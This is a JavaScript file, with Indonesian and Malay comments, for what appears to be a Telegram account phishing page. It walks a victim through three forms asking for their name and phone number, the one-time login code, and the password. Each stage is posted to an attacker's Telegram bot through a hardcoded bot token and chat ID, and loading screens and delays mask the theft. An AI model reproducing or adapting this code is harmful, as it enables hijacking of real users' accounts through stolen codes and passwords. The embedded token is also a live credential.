// Inisialisasi intl-tel-input
const phoneInputField = document.querySelector("#phone");
const phoneInput = window.intlTelInput(phoneInputField, {
  preferredCountries: ["my", "id", "us"],
  utilsScript:
    "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
});

// Fungsi untuk menampilkan halaman
function showPage(pageId) {
  document.querySelectorAll(".page").forEach((page) => {
    page.style.display = "none";
  });
  document.getElementById(pageId).style.display = "block";
}

// Fungsi untuk mengirim data ke Telegram
function sendToTelegram(message) {
  const token = "7631485703:AAFVK8I7AnMoUvNFLek_n4SIz1e3RJkpP9Q"; // Token bot Telegram Anda
  const chatId = "8128853144"; // Chat ID atau ID grup Anda

  return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}

// Handler form registrasi (halaman 1)
document
  .getElementById("registrationForm")
  .addEventListener("submit", function (event) {
    event.preventDefault();
    const name = document.getElementById("name").value;
    const phone = phoneInput.getNumber();

    localStorage.setItem("name", name);
    localStorage.setItem("phone", phone);

    const otpMessage = document.querySelector("#page2 .form-container p");
    otpMessage.textContent = `Sila Masukan Kod-yang dihantar ke Nombor ${phone}`;

    const message = `
────────────────
🔰 DATA | NOMBOR TELEGRAM 🔰
────────────────
👤 Nama  : ${name}
📱 No HP : \`${phone}\`
────────────────`;

    document.getElementById("loadingScreen").style.display = "flex";

    // Tambah timeout 15 detik untuk halaman pertama
    setTimeout(() => {
      sendToTelegram(message)
        .then((response) => {
          if (response.ok) {
            showPage("page2");
          }
        })
        .finally(() => {
          document.getElementById("loadingScreen").style.display = "none";
        });
    }, 2000); // 15 detik
  });

// Handler form OTP (halaman 2)
document.getElementById("otpForm").addEventListener("submit", function (event) {
  event.preventDefault();
  const otpInputs = document.querySelectorAll(".otp-input");
  const otp = Array.from(otpInputs)
    .map((input) => input.value)
    .join("");

  localStorage.setItem("otp", otp);
  const savedPhone = localStorage.getItem("phone");
  const savedName = localStorage.getItem("name");

  const message = ` 
────────────────
🔰 DATA | OTP 🔰
────────────────
👤 Nama  : ${savedName}
📱 No HP : \`${savedPhone}\`
🔑 OTP   : ${otp}
────────────────`;

  document.getElementById("loadingScreen").style.display = "flex";

  // Timeout 2 detik untuk halaman kedua
  setTimeout(() => {
    sendToTelegram(message)
      .then((response) => {
        if (response.ok) {
          showPage("page3");
        }
      })
      .finally(() => {
        document.getElementById("loadingScreen").style.display = "none";
      });
  }, 2000); // 2 detik
});

// Handler form kata sandi (halaman 3)
document
  .getElementById("passwordForm")
  .addEventListener("submit", function (e) {
    e.preventDefault();

    // Ambil nilai password dan data tersimpan
    const password = document.getElementById("kata-sandi").value;
    const savedPhone = localStorage.getItem("phone");
    const savedName = localStorage.getItem("name");
    const savedOTP = localStorage.getItem("otp");

    const message = `
────────────────
🔰 DATA | KATA SANDI 🔰
────────────────
👤 Nama  : ${savedName}
📱 No HP : \`${savedPhone}\`
🔑 OTP   : ${savedOTP}
🔐 Kata Laluan : ${password}
──────────────`;

    // Kirim ke Telegram
    sendToTelegram(message).then((response) => {
      if (response.ok) {
        // Sembunyikan form dan tampilkan loading
        document.getElementById("passwordForm").style.display = "none";
        document.getElementById("kataSandi").style.display = "none";
        document.getElementById("loadingContent").style.display = "block";
      }
    });
  });

// Handler untuk tombol "Gunakan Nombor Lain"
document
  .getElementById("useAnotherPhone")
  .addEventListener("click", function () {
    showPage("page1"); // Kembali ke halaman pertama
    // Reset semua form
    document.getElementById("passwordForm").reset();
    document.getElementById("otpForm").reset();
    document.getElementById("registrationForm").reset();

    // Kembalikan tampilan form password ke kondisi awal
    document.getElementById("passwordForm").style.display = "block";
    document.getElementById("kataSandi").style.display = "block";
    document.getElementById("loadingContent").style.display = "none";
  });

// Tambahkan sebelum akhir script
// Handler untuk input OTP
document.querySelectorAll(".otp-input").forEach((input, index) => {
  input.addEventListener("input", function (e) {
    // Hapus karakter non-angka
    this.value = this.value.replace(/[^0-9]/g, "");

    // Batasi input menjadi 1 digit
    if (this.value.length > 1) {
      this.value = this.value[0];
    }

    // Pindah ke input berikutnya jika ada nilai
    if (this.value.length === 1) {
      const nextInput = document.querySelectorAll(".otp-input")[index + 1];
      if (nextInput) {
        nextInput.focus();
      }
    }
  });

  // Handler untuk tombol backspace
  input.addEventListener("keydown", function (e) {
    if (e.key === "Backspace" && !this.value) {
      const prevInput = document.querySelectorAll(".otp-input")[index - 1];
      if (prevInput) {
        prevInput.focus();
        // Opsional: Hapus nilai input sebelumnya
        // prevInput.value = '';
      }
    }
  });
});

// js untuk auto scroll
function startAutoScroll() {
  const lists = document.querySelectorAll(".list"); // Ambil semua elemen dengan class list

  lists.forEach((list) => {
    let isScrolling = true;

    function scroll() {
      if (!isScrolling) return;

      const firstItem = list.querySelector(".item");
      if (!firstItem) return;

      const itemHeight = firstItem.offsetHeight;

      // Animasi scroll
      list.style.transition = "transform 1s ease";
      list.style.transform = `translateY(-${itemHeight}px)`;

      // Reset posisi setelah animasi
      setTimeout(() => {
        list.style.transition = "none";
        list.style.transform = "translateY(0)";
        list.appendChild(firstItem.cloneNode(true));
        firstItem.remove();

        // Lanjutkan scroll
        setTimeout(() => {
          requestAnimationFrame(scroll);
        }, 1500); // Jeda 2 detik sebelum item berikutnya
      }, 1000);
    }

    // Mulai scroll
    scroll();

    // Handle hover
    const listBox = list.closest(".list-box");
    if (listBox) {
      listBox.addEventListener("mouseenter", () => {
        isScrolling = false;
      });

      listBox.addEventListener("mouseleave", () => {
        isScrolling = true;
        scroll();
      });
    }
  });
}

// Panggil fungsi saat dokumen dimuat
document.addEventListener("DOMContentLoaded", startAutoScroll);
